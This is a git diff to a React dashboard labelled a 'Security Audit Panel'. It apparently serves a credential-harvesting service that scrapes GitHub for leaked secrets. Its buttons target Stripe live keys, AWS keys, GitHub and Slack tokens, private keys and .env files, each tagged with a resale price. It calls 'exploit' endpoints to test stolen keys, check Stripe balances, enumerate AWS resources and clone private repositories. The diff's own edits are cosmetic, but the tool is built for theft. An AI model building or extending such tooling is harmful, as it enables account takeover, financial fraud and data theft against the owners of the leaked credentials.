@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react';
-import { Search, Database, AlertTriangle, CheckCircle, XCircle, Loader, Eye, Trash2, Download } from 'lucide-react';
+import { Search, Database, AlertTriangle, CheckCircle, XCircle, Loader, Eye, Trash2, Download, Shield, Lock, Key, Cloud, DollarSign, Code, Activity } from 'lucide-react';
+import Head from 'next/head';
 
 export default function SecurityAuditPanel() {
   const [adminKey, setAdminKey] = useState('');
@@ -18,6 +19,8 @@ export default function SecurityAuditPanel() {
   const [liveProgress, setLiveProgress] = useState([]);
   const [terminalLogs, setTerminalLogs] = useState([]);
   const [exploitResults, setExploitResults] = useState(null);
+  const [loading, setLoading] = useState(false);
+  const [loadingText, setLoadingText] = useState('');
 
   const API_URL = process.env.NEXT_PUBLIC_API_URL || 'https://autoclaimtoken.onrender.com';
 
@@ -80,6 +83,8 @@ export default function SecurityAuditPanel() {
     }
 
     setScanning(true);
+    setLoading(true);
+    setLoadingText('Scanning GitHub repositories...');
     setResults([]);
     setScanLogs([]);
     setTerminalLogs([]);
@@ -133,6 +138,8 @@ export default function SecurityAuditPanel() {
       alert('Scan failed: ' + error.message);
     } finally {
       setScanning(false);
+      setLoading(false);
+      setLoadingText('');
     }
   };
 
@@ -298,6 +305,11 @@ export default function SecurityAuditPanel() {
 
   if (!authenticated) {
     return (
+      <>
+      <Head>
+        <title>Security Audit Panel - Admin Access</title>
+        <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6195/6195699.png" />
+      </Head>
       <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 flex items-center justify-center p-4">
         <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full border border-purple-500/30">
           <div className="text-center mb-6">
@@ -323,10 +335,36 @@ export default function SecurityAuditPanel() {
           </button>
         </div>
       </div>
+      </>
     );
   }
 
   return (
+    <>
+    <Head>
+      <title>Security Audit Dashboard - {stats?.totalCredentials || 0} Credentials</title>
+      <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6195/6195699.png" />
+    </Head>
+    
+    {/* Global Loading Overlay */}
+    {loading && (
+      <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center">
+        <div className="bg-gray-800 rounded-2xl p-8 border border-purple-500 max-w-md w-full mx-4">
+          <div className="flex items-center justify-center mb-4">
+            <Loader className="w-12 h-12 text-purple-400 animate-spin" />
+          </div>
+          <div className="text-white text-xl font-bold text-center mb-2">{loadingText}</div>
+          <div className="text-gray-400 text-sm text-center">Please wait, this may take a few moments...</div>
+          <div className="mt-4 bg-gray-900 rounded-lg p-3">
+            <div className="flex items-center gap-2 text-sm text-gray-300">
+              <Activity className="w-4 h-4 text-green-400 animate-pulse" />
+              <span>Processing request...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    )}
+    
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 p-4">
       <div className="max-w-7xl mx-auto">
         {/* Header */}
@@ -367,15 +405,24 @@ export default function SecurityAuditPanel() {
             </div>
             <button
               onClick={async () => {
+                setLoading(true);
+                setLoadingText('Checking for duplicates...');
                 try {
                   const response = await fetch(`${API_URL}/scraper/duplicates`, {
                     headers: { 'x-admin-key': adminKey }
                   });
                   const data = await response.json();
                   if (data.success && data.totalDuplicates > 0) {
-                    alert(`🚨 Found ${data.totalDuplicates} duplicates!\n\nGo to Database tab to clean them.`);
+                    alert(`Found ${data.totalDuplicates} duplicates!\n\nGo to Database tab to clean them.`);
+                  } else {
+                    alert('No duplicates found!');
                   }
-                } catch (error) {}
+                } catch (error) {
+                  alert('Check failed: ' + error.message);
+                } finally {
+                  setLoading(false);
+                  setLoadingText('');
+                }
               }}
               className="w-full bg-orange-900/30 border border-orange-500 rounded-xl p-3 hover:bg-orange-900/50 transition text-left"
             >
@@ -508,64 +555,89 @@ export default function SecurityAuditPanel() {
             {/* Quick High-Value Targets */}
             <div className="mt-6 bg-gradient-to-r from-green-900/30 to-yellow-900/30 rounded-lg p-4 border border-green-500/50">
               <div className="text-green-400 font-bold mb-3 flex items-center gap-2">
-                <span>💎</span> QUICK SCAN: High-Value Targets
+                <DollarSign className="w-6 h-6" />
+                <span>QUICK SCAN: High-Value Targets</span>
               </div>
               <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                 <button
                   onClick={() => { setSearchInput('sk_live_'); setSearchType('keyword'); }}
-                  className="bg-green-600 hover:bg-green-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-green-600 hover:bg-green-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">💰 Stripe Live Keys</div>
-                  <div className="text-xs opacity-80">$500-$2000 | REAL MONEY</div>
+                  <DollarSign className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">Stripe Live Keys</div>
+                    <div className="text-xs opacity-80">$500-$2000 | REAL MONEY</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('AKIA'); setSearchType('keyword'); }}
-                  className="bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">☁️ AWS Keys</div>
-                  <div className="text-xs opacity-80">$300-$1000 each</div>
+                  <Cloud className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">AWS Keys</div>
+                    <div className="text-xs opacity-80">$300-$1000 each</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('ghp_'); setSearchType('keyword'); }}
-                  className="bg-purple-600 hover:bg-purple-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-purple-600 hover:bg-purple-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">🔑 GitHub Tokens</div>
-                  <div className="text-xs opacity-80">$50-$200 each</div>
+                  <Code className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">GitHub Tokens</div>
+                    <div className="text-xs opacity-80">$50-$200 each</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('xox'); setSearchType('keyword'); }}
-                  className="bg-yellow-600 hover:bg-yellow-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-yellow-600 hover:bg-yellow-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">💬 Slack Tokens</div>
-                  <div className="text-xs opacity-80">$100-$500 each</div>
+                  <Key className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">Slack Tokens</div>
+                    <div className="text-xs opacity-80">$100-$500 each</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('-----BEGIN RSA PRIVATE KEY-----'); setSearchType('keyword'); }}
-                  className="bg-red-600 hover:bg-red-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-red-600 hover:bg-red-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">🔐 Private Keys</div>
-                  <div className="text-xs opacity-80">$200-$800 each</div>
+                  <Lock className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">Private Keys</div>
+                    <div className="text-xs opacity-80">$200-$800 each</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('api_key'); setSearchType('keyword'); }}
-                  className="bg-indigo-600 hover:bg-indigo-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-indigo-600 hover:bg-indigo-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">🔌 API Keys</div>
-                  <div className="text-xs opacity-80">$10-$100 each</div>
+                  <Key className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">API Keys</div>
+                    <div className="text-xs opacity-80">$10-$100 each</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('password'); setSearchType('keyword'); }}
-                  className="bg-orange-600 hover:bg-orange-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-orange-600 hover:bg-orange-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">🔑 Passwords</div>
-                  <div className="text-xs opacity-80">$1-$10 each</div>
+                  <Shield className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">Passwords</div>
+                    <div className="text-xs opacity-80">$1-$10 each</div>
+                  </div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('.env'); setSearchType('keyword'); }}
-                  className="bg-pink-600 hover:bg-pink-700 text-white p-3 rounded-lg transition text-left"
+                  className="bg-pink-600 hover:bg-pink-700 text-white p-3 rounded-lg transition text-left flex items-center gap-2"
                 >
-                  <div className="font-bold text-sm">📄 .env Files</div>
-                  <div className="text-xs opacity-80">Mixed value</div>
+                  <Database className="w-5 h-5" />
+                  <div>
+                    <div className="font-bold text-sm">.env Files</div>
+                    <div className="text-xs opacity-80">Mixed value</div>
+                  </div>
                 </button>
               </div>
               <div className="mt-3 text-xs text-gray-400">
@@ -633,6 +705,8 @@ export default function SecurityAuditPanel() {
                 <div className="flex gap-2">
                   <button
                     onClick={async () => {
+                      setLoading(true);
+                      setLoadingText('Loading high-value credentials...');
                       try {
                         const response = await fetch(`${API_URL}/scraper/all-credentials?limit=50000&category=high-value`, {
                           headers: { 'x-admin-key': adminKey }
@@ -644,14 +718,20 @@ export default function SecurityAuditPanel() {
                         }
                       } catch (error) {
                         alert('Failed to load: ' + error.message);
+                      } finally {
+                        setLoading(false);
+                        setLoadingText('');
                       }
                     }}
-                    className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition"
+                    className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition flex items-center gap-2"
                   >
-                    🔥 High-Value Only
+                    <DollarSign className="w-4 h-4" />
+                    High-Value Only
                   </button>
                   <button
                     onClick={async () => {
+                      setLoading(true);
+                      setLoadingText('Loading all credentials...');
                       try {
                         const response = await fetch(`${API_URL}/scraper/all-credentials?limit=10000`, {
                           headers: { 'x-admin-key': adminKey }
@@ -663,10 +743,14 @@ export default function SecurityAuditPanel() {
                         }
                       } catch (error) {
                         alert('Failed to load: ' + error.message);
+                      } finally {
+                        setLoading(false);
+                        setLoadingText('');
                       }
                     }}
-                    className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition"
+                    className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition flex items-center gap-2"
                   >
+                    <Database className="w-4 h-4" />
                     Load All ({stats?.totalCredentials || 0})
                   </button>
                 </div>
@@ -686,7 +770,9 @@ export default function SecurityAuditPanel() {
               {/* Auto-Tester */}
               <div className="bg-gradient-to-br from-blue-900/30 to-blue-800/30 border border-blue-500 rounded-xl p-6">
                 <div className="flex items-center gap-3 mb-4">
-                  <div className="text-3xl">🧪</div>
+                  <div className="bg-blue-500/20 p-3 rounded-lg">
+                    <Activity className="w-8 h-8 text-blue-400" />
+                  </div>
                   <div>
                     <h3 className="text-white font-bold text-lg">Auto-Tester</h3>
                     <p className="text-gray-400 text-sm">Test all keys automatically</p>
@@ -696,13 +782,8 @@ export default function SecurityAuditPanel() {
                   onClick={async () => {
                     if (!results.length) return alert('No credentials to test');
                     if (!confirm(`Test ALL ${results.length} credentials? This may take several minutes.`)) return;
-                    const btn = event.target;
-                    btn.disabled = true;
-                    let count = 0;
-                    const interval = setInterval(() => {
-                      count++;
-                      btn.textContent = `Testing... ${count}s`;
-                    }, 1000);
+                    setLoading(true);
+                    setLoadingText(`Testing ${results.length} credentials...`);
                     try {
                       const response = await fetch(`${API_URL}/api/exploit/test-all`, {
                         method: 'POST',
@@ -717,9 +798,8 @@ export default function SecurityAuditPanel() {
                     } catch (error) {
                       alert('Test failed: ' + error.message);
                     } finally {
-                      clearInterval(interval);
-                      btn.disabled = false;
-                      btn.textContent = `Test All Keys (${results.length})`;
+                      setLoading(false);
+                      setLoadingText('');
                     }
                   }}
                   className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
@@ -734,7 +814,9 @@ export default function SecurityAuditPanel() {
               {/* Balance Checker */}
               <div className="bg-gradient-to-br from-green-900/30 to-green-800/30 border border-green-500 rounded-xl p-6">
                 <div className="flex items-center gap-3 mb-4">
-                  <div className="text-3xl">💰</div>
+                  <div className="bg-green-500/20 p-3 rounded-lg">
+                    <DollarSign className="w-8 h-8 text-green-400" />
+                  </div>
                   <div>
                     <h3 className="text-white font-bold text-lg">Balance Checker</h3>
                     <p className="text-gray-400 text-sm">Check Stripe account balances</p>
@@ -747,13 +829,8 @@ export default function SecurityAuditPanel() {
                     const maxKeys = 500;
                     const keysToCheck = stripeKeys.length > maxKeys ? maxKeys : stripeKeys.length;
                     if (!confirm(`Check ${keysToCheck} Stripe keys? (Limited to ${maxKeys} max)\n\nEstimated time: ${Math.ceil(keysToCheck / 10)} seconds`)) return;
-                    const btn = event.target;
-                    btn.disabled = true;
-                    let count = 0;
-                    const interval = setInterval(() => {
-                      count++;
-                      btn.textContent = `Checking... ${count}s / ~${Math.ceil(keysToCheck / 10)}s`;
-                    }, 1000);
+                    setLoading(true);
+                    setLoadingText(`Checking ${keysToCheck} Stripe balances...`);
                     try {
                       const controller = new AbortController();
                       const timeout = setTimeout(() => controller.abort(), 300000); // 5 min max
@@ -782,9 +859,8 @@ export default function SecurityAuditPanel() {
                         alert('Check failed: ' + error.message);
                       }
                     } finally {
-                      clearInterval(interval);
-                      btn.disabled = false;
-                      btn.textContent = `Check Balances (${stripeKeys.length})`;
+                      setLoading(false);
+                      setLoadingText('');
                     }
                   }}
                   className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
@@ -799,7 +875,9 @@ export default function SecurityAuditPanel() {
               {/* AWS Scanner */}
               <div className="bg-gradient-to-br from-purple-900/30 to-purple-800/30 border border-purple-500 rounded-xl p-6">
                 <div className="flex items-center gap-3 mb-4">
-                  <div className="text-3xl">☁️</div>
+                  <div className="bg-purple-500/20 p-3 rounded-lg">
+                    <Cloud className="w-8 h-8 text-purple-400" />
+                  </div>
                   <div>
                     <h3 className="text-white font-bold text-lg">AWS Scanner</h3>
                     <p className="text-gray-400 text-sm">List all AWS resources</p>
@@ -809,6 +887,8 @@ export default function SecurityAuditPanel() {
                   onClick={async () => {
                     const awsKeys = results.filter(r => r.category === 'cloud_access');
                     if (!awsKeys.length) return alert('No AWS keys found');
+                    setLoading(true);
+                    setLoadingText(`Scanning ${awsKeys.length} AWS keys...`);
                     try {
                       const response = await fetch(`${API_URL}/api/exploit/scan-aws`, {
                         method: 'POST',
@@ -822,6 +902,9 @@ export default function SecurityAuditPanel() {
                       }
                     } catch (error) {
                       alert('Scan failed: ' + error.message);
+                    } finally {
+                      setLoading(false);
+                      setLoadingText('');
                     }
                   }}
                   className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-lg font-semibold transition"
@@ -836,7 +919,9 @@ export default function SecurityAuditPanel() {
               {/* GitHub Cloner */}
               <div className="bg-gradient-to-br from-pink-900/30 to-pink-800/30 border border-pink-500 rounded-xl p-6">
                 <div className="flex items-center gap-3 mb-4">
-                  <div className="text-3xl">📦</div>
+                  <div className="bg-pink-500/20 p-3 rounded-lg">
+                    <Code className="w-8 h-8 text-pink-400" />
+                  </div>
                   <div>
                     <h3 className="text-white font-bold text-lg">GitHub Cloner</h3>
                     <p className="text-gray-400 text-sm">Download private repos</p>
@@ -846,10 +931,9 @@ export default function SecurityAuditPanel() {
                   onClick={async () => {
                     const githubTokens = results.filter(r => r.credential_type === 'github_token');
                     if (!githubTokens.length) return alert('No GitHub tokens found');
-                    const btn = event.target;
-                    btn.disabled = true;
-                    btn.textContent = 'Scanning...';
-                    try {
+                    setLoading(true);
+                    setLoadingText(`Scanning ${githubTokens.length} GitHub tokens...`);
+                    try{
                       const response = await fetch(`${API_URL}/api/exploit/clone-github`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
@@ -863,8 +947,8 @@ export default function SecurityAuditPanel() {
                     } catch (error) {
                       alert('Clone failed: ' + error.message);
                     } finally {
-                      btn.disabled = false;
-                      btn.textContent = `Clone Repos (${githubTokens.length})`;
+                      setLoading(false);
+                      setLoadingText('');
                     }
                   }}
                   className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
@@ -1300,6 +1384,8 @@ export default function SecurityAuditPanel() {
               <h2 className="text-2xl font-bold text-white">All Credentials ({allCredentials.length})</h2>
               <button
                 onClick={async () => {
+                  setLoading(true);
+                  setLoadingText('Scanning for duplicates...');
                   try {
                     const response = await fetch(`${API_URL}/scraper/duplicates`, {
                       headers: { 'x-admin-key': adminKey }
@@ -1311,6 +1397,7 @@ export default function SecurityAuditPanel() {
                       } else {
                         const confirmed = confirm(`Found ${data.totalDuplicates} duplicate credentials in ${data.duplicateGroups} groups.\n\nDelete all duplicates? (Keeps oldest entry)`);
                         if (confirmed) {
+                          setLoadingText('Deleting duplicates...');
                           const deleteResponse = await fetch(`${API_URL}/scraper/delete-duplicates`, {
                             method: 'POST',
                             headers: { 'x-admin-key': adminKey }
@@ -1326,6 +1413,9 @@ export default function SecurityAuditPanel() {
                     }
                   } catch (error) {
                     alert('Failed: ' + error.message);
+                  } finally {
+                    setLoading(false);
+                    setLoadingText('');
                   }
                 }}
                 className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition flex items-center gap-2"
@@ -1372,5 +1462,6 @@ export default function SecurityAuditPanel() {
         )}
       </div>
     </div>
+    </>
   );
 }
